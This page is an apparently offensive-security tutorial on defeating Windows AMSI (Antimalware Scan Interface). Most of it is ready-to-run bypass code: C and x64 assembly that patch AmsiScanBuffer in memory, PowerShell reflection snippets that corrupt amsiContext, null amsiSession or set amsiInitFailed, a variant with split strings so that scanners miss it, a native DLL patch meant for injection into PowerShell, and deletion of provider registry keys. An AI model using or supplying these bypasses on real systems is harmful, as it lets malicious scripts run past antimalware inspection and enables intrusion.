---
layout: page
title: "AMSI Bypass: Patching the Inspection Pipeline"
---

# AMSI Bypass: Patching the Inspection Pipeline

The previous article established how AMSI works: content is submitted to `AmsiScanBuffer`, routed to registered providers, and the result determines whether execution proceeds. A bypass modifies one point in this pipeline so that malicious content passes inspection. The pipeline has multiple points of intervention, each with different trade-offs in detectability, reliability, and scope.

## Patching AmsiScanBuffer

The most direct approach patches `AmsiScanBuffer` in `amsi.dll` to return immediately with a clean result. The function's first instruction is overwritten with a `ret` or a sequence that forces the output result to `AMSI_RESULT_CLEAN` before returning.

From native code:

```c
#include <windows.h>

void patch_amsi_scan_buffer(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    LPVOID  scan = GetProcAddress(amsi, "AmsiScanBuffer");

    // Patch: xor eax, eax (return S_OK) + ret
    // S_OK = 0x00000000, which also satisfies the result check
    // But we also need *result to be AMSI_RESULT_CLEAN
    // Simpler: just ret immediately -- result param is uninitialized = 0 = CLEAN
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
                     0xC3 };                           // ret

    // Returning E_INVALIDARG causes PowerShell to skip the block check
    // because the HRESULT failure means "scan did not complete"
    // and PowerShell treats scan failure as non-detection on some versions

    DWORD old;
    VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, sizeof(patch), old, &old);
}
```

The choice of return value matters. Returning `S_OK` (0) with an uninitialized `*result` leaves the result pointer pointing at whatever was in memory, which is usually zero, which equals `AMSI_RESULT_CLEAN`. Returning an error `HRESULT` like `E_INVALIDARG` (0x80070057) causes the host to treat the scan as failed rather than detected. PowerShell's handling of scan failures depends on the version: some treat failure as allow, others treat it as block.

The most reliable approach forces `*result` to a specific clean value before returning:

```asm
; AmsiScanBuffer patch (x64)
; Function signature: AmsiScanBuffer(ctx, buf, len, name, session, *result)
;
; x64 stack at function entry (before any prologue):
;   [rsp+0x00]  return address
;   [rsp+0x08]  shadow: RCX = amsiContext
;   [rsp+0x10]  shadow: RDX = buffer
;   [rsp+0x18]  shadow: R8  = length
;   [rsp+0x20]  shadow: R9  = contentName
;   [rsp+0x28]  5th arg   = amsiSession
;   [rsp+0x30]  6th arg   = AMSI_RESULT* result   <── target

; Read result pointer from [rsp+0x30], write AMSI_RESULT_CLEAN
mov rax, [rsp+0x30]     ; rax = AMSI_RESULT* result
mov dword ptr [rax], 0  ; *result = AMSI_RESULT_CLEAN
xor eax, eax            ; return S_OK
ret
```

The 6th argument (`AMSI_RESULT *result`) is at `[rsp+0x30]` at function entry, before the prologue runs. `[rsp+0x28]` is `amsiSession` (5th argument). Reading the pointer from `[rsp+0x30]` and writing zero to it sets `*result = AMSI_RESULT_CLEAN`. The function returns `S_OK` and the host proceeds with execution.

## Corrupting the AMSI_CONTEXT Signature

The `AMSI_CONTEXT` structure begins with a four-byte signature: the ASCII bytes of "AMSI" (`0x49534D41`). `AmsiScanBuffer` checks this signature at entry. If it does not match, the function returns `E_INVALIDARG` immediately without calling any provider.

The bypass: locate the signature in the context and overwrite it with anything else.

In PowerShell, through .NET reflection, the AMSI context handle is accessible because PowerShell stores it in a field of a known internal class. Reading that field gives the pointer value. Writing four bytes at that address corrupts the signature:

```powershell
# PowerShell reflection bypass -- corrupts AMSI_CONTEXT signature
$amsi_utils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi_ctx   = $amsi_utils.GetField('amsiContext',
                  [Reflection.BindingFlags] 'NonPublic,Static')
$ctx_value  = $amsi_ctx.GetValue($null)

# ctx_value is an IntPtr to the AMSI_CONTEXT structure
# Write garbage over the first 4 bytes (the "AMSI" signature)
$ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($ctx_value)

[System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0xDEADBEEF)
```

After this, any subsequent `AmsiScanBuffer` call fails immediately because the signature check fails. The scan never reaches any provider. The result pointer is never written, and the host receives `E_INVALIDARG`, which it interprets as a scan failure rather than a detection.

The string `"amsiContext"` and `"AmsiUtils"` are detectable literals. EDRs and AMSI providers scan for these strings in submitted PowerShell content. They are signatures in the conventional sense: the bypass code is itself detectable by the thing it is trying to bypass. The workaround is string obfuscation applied to the bypass code before submission.

## Forcing the Session to Null

`AmsiScanBuffer` also validates the `HAMSISESSION` parameter. If the session handle is invalid or null, the function may skip provider calls entirely depending on implementation. The bypass finds the session field in the same `AmsiUtils` class and sets it to null or an invalid value:

```powershell
$amsi_utils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

$session_field = $amsi_utils.GetField('amsiSession',
                     [Reflection.BindingFlags] 'NonPublic,Static')
$session_field.SetValue($null, $null)

# Also zero out the context to be thorough
$ctx_field = $amsi_utils.GetField('amsiContext',
                 [Reflection.BindingFlags] 'NonPublic,Static')
$ctx_field.SetValue($null, [IntPtr]::Zero)
```

Setting both `amsiContext` and `amsiSession` to null or zero means `AmsiScanBuffer` receives null pointers for both the context and session arguments. The signature check on the context fails immediately. No scan occurs.

## Patching amsiInitFailed

PowerShell's `AmsiUtils` class contains a boolean field `amsiInitFailed`. When this field is true, PowerShell skips the AMSI scan entirely and treats all content as clean. Setting it to true is the cleanest bypass because it operates at the host level rather than inside `amsi.dll`:

```powershell
$amsi_utils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

$init_failed = $amsi_utils.GetField('amsiInitFailed',
                   [Reflection.BindingFlags] 'NonPublic,Static')
$init_failed.SetValue($null, $true)
```

Three lines. No memory writing through `Marshal`. No pointer arithmetic. PowerShell reads `amsiInitFailed` before every `AmsiScanBuffer` call and short-circuits if it is true.

This is also one of the most-detected bypasses because the field name is a known signature and AMSI providers specifically watch for reflection access to `AmsiUtils`. The string `"amsiInitFailed"` in submitted content is flagged by most providers regardless of surrounding context.

## Obfuscating the Bypass

The bypass code is itself submitted to AMSI before execution. If any string in the bypass matches a provider signature, the bypass is blocked before it runs. Every field name, class name, and method name used in a reflection-based bypass is a potential signature.

Obfuscation splits and reconstructs strings at runtime so they never appear as literals in the submitted content:

```powershell
# Reconstruct "AmsiUtils" without the literal string
$a = 'Amsi'
$b = 'Utils'
$class_name = "System.Management.Automation.$a$b"

# Reconstruct "amsiInitFailed"
$field = ('amsi','Init','Failed' -join '')

$utils = [Ref].Assembly.GetType($class_name)
$f     = $utils.GetField($field, [Reflection.BindingFlags]'NonPublic,Static')
$f.SetValue($null, $true)
```

The assembled strings are only created in memory at runtime, after the submitted content has already been scanned. At scan time, no recognizable signature is present. After the bypass runs, subsequent content is not inspected.

This is a race between bypass signature detection and obfuscation complexity. Providers update their signatures for known bypass patterns. New obfuscation variants emerge. The cat-and-mouse cycle is continuous.

## Native Code Bypass: Patching from a DLL

A bypass that does not go through PowerShell reflection avoids the string-signature problem entirely. A compiled DLL injected into the PowerShell process patches `amsi.dll` directly:

```c
void amsi_bypass_from_native(void) {
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) amsi = LoadLibraryA("amsi.dll");

    LPVOID scan = GetProcAddress(amsi, "AmsiScanBuffer");

    // Patch to: mov eax, 0; ret
    // *result is unwritten, defaults to 0 = AMSI_RESULT_CLEAN
    // HRESULT return of 0 = S_OK
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };  // xor eax, eax; ret

    DWORD old;
    VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, sizeof(patch), old, &old);
}
```

No string literals from the bypass appear in any PowerShell content submitted to AMSI. The DLL itself is compiled code, not a script. Its delivery requires a separate injection step (any technique from the process injection article), but once it runs in the PowerShell process, AMSI is permanently disabled for that session.

## The Scan Before the Bypass

Every PowerShell-based bypass faces the same constraint: the bypass code is submitted to AMSI before it executes. If AMSI detects the bypass, it never runs. If AMSI allows the bypass, it runs and disables AMSI for everything that follows.

The bypass code must be clean enough to pass the initial scan. This is satisfied by obfuscation (making the bypass unrecognizable at scan time) or by delivery through a vector that does not go through the PowerShell AMSI scan (native injection, `Assembly.Load` from a byte array in some contexts, or staging through a mechanism that bypasses the PowerShell execution pipeline).

## Provider Unregistration

The AMSI provider list is in the registry at `HKLM\SOFTWARE\Microsoft\AMSI\Providers`. Deleting a provider's CLSID subkey unregisters it for future `AmsiInitialize` calls. This does not affect running sessions, because providers are instantiated during `AmsiInitialize` and the registry is not consulted again during scanning. Unregistration is a persistence-level technique: it affects new processes that initialize AMSI after the registry modification.

Writing to `HKLM` requires administrator privileges. A user-mode bypass operating in an unprivileged context cannot use this approach.

## What Survives AMSI Bypass

AMSI bypass stops content from being inspected by AMSI providers. It does not disable EDR behavioral monitoring of what PowerShell does after the script executes. A payload that passes AMSI and then calls `VirtualAlloc`, writes shellcode, and executes it produces behavioral signals regardless of whether AMSI saw the script content.

Bypassing AMSI removes the content-inspection gate. What the executed code does is monitored through a completely separate channel. Script-based payloads that only use PowerShell built-ins and do not invoke suspicious native APIs produce less behavioral signal after AMSI bypass. Payloads that ultimately call into native injection or allocation routines produce the same behavioral telemetry with or without an AMSI bypass.
